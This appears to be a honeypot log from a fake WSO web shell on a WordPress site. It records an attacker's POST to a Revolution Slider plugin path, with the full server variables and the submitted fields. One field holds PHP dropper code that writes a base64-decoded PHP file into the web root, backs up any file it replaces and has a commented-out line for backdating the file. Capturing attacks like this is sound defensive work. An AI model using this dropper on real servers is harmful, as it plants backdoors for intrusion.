
_SERVER
Array
(
    [UNIQUE_ID] => WhdX2hdZm0Z2rcNQ09X9ZgAAAAA
    [SCRIPT_URL] => /wordpress/wp-content/plugins/revslider/temp/update_extract/revslider/db.php
    [SCRIPT_URI] => http://www.stratigery.com/wordpress/wp-content/plugins/revslider/temp/update_extract/revslider/db.php
    [HTTP_HOST] => www.stratigery.com
    [HTTP_USER_AGENT] => Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36
    [HTTP_ACCEPT] => */*
    [HTTP_CACHE_CONTROL] => no-cache
    [CONTENT_LENGTH] => 185739
    [CONTENT_TYPE] => application/x-www-form-urlencoded
    [HTTP_EXPECT] => 100-continue
    [PATH] => /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin
    [SERVER_SIGNATURE] => 
    [SERVER_SOFTWARE] => Apache/2.4.29 (Unix) PHP/7.1.12
    [SERVER_NAME] => www.stratigery.com
    [SERVER_ADDR] => 162.246.45.144
    [SERVER_PORT] => 80
    [REMOTE_ADDR] => 194.165.16.79
    [DOCUMENT_ROOT] => /srv/http/stratigery/htdocs
    [REQUEST_SCHEME] => http
    [CONTEXT_PREFIX] => 
    [CONTEXT_DOCUMENT_ROOT] => /srv/http/stratigery/htdocs
    [SERVER_ADMIN] => bediger@stratigery.com
    [SCRIPT_FILENAME] => /srv/http/stratigery/htdocs/fake_wp/wso.php
    [REMOTE_PORT] => 63389
    [GATEWAY_INTERFACE] => CGI/1.1
    [SERVER_PROTOCOL] => HTTP/1.1
    [REQUEST_METHOD] => POST
    [QUERY_STRING] => 
    [REQUEST_URI] => /wordpress/wp-content/plugins/revslider/temp/update_extract/revslider/db.php
    [SCRIPT_NAME] => /wordpress/wp-content/plugins/revslider/temp/update_extract/revslider/db.php
    [PHP_SELF] => /wordpress/wp-content/plugins/revslider/temp/update_extract/revslider/db.php
    [REQUEST_TIME_FLOAT] => 1511479258.197
    [REQUEST_TIME] => 1511479258
)

_REQUEST
Array
(
    [a] => Php
    [c] => 
    [p1] => $a="";
            $file_name = "4048ad7bdb2.php";
            if( !empty($_SERVER["REAL_DOCUMENT_ROOT"]) ){
                $doc_root = $_SERVER["REAL_DOCUMENT_ROOT"];
            } else {
                $doc_root = $_SERVER["DOCUMENT_ROOT"];
            }

            $f_n = $doc_root . "/" . $file_name;

            if ( !write_file($f_n, $a) )
                write_file($file_name, $a);

            function write_file($file_name, $a){

                if( file_exists($file_name) ){
                    copy($file_name, $file_name."_backup");
                }
                if( file_put_contents($file_name, base64_decode($a)) )
                {		
                    echo "OK file saved";
                    //touch($file_name, time() - 3600 * 24 * rand(10, 70));
                    return true;
                }

                return false;
            }
    [p2] => 
    [p3] => 
    [charset] => UTF-8
    [pass] => nhzgrf
)

_COOKIE
 Array
(
)

_FILES
 
END _FILES
 $my_blog=http://www.stratigery.com/wordpress/wp-content/plugins/revslider/temp/update_extract/revslider
pass parameter, acting as WSO
Acting as WSO, login cookie.
a = Php
c = 
p1 = $a="";
            $file_name = "4048ad7bdb2.php";
            if( !empty($_SERVER["REAL_DOCUMENT_ROOT"]) ){
                $doc_root = $_SERVER["REAL_DOCUMENT_ROOT"];
            } else {
                $doc_root = $_SERVER["DOCUMENT_ROOT"];
            }

            $f_n = $doc_root . "/" . $file_name;

            if ( !write_file($f_n, $a) )
                write_file($file_name, $a);

            function write_file($file_name, $a){

                if( file_exists($file_name) ){
                    copy($file_name, $file_name."_backup");
                }
                if( file_put_contents($file_name, base64_decode($a)) )
                {		
                    echo "OK file saved";
                    //touch($file_name, time() - 3600 * 24 * rand(10, 70));
                    return true;
                }

                return false;
            }
p2 = 
p3 = 
Acting as WSO, send php console.
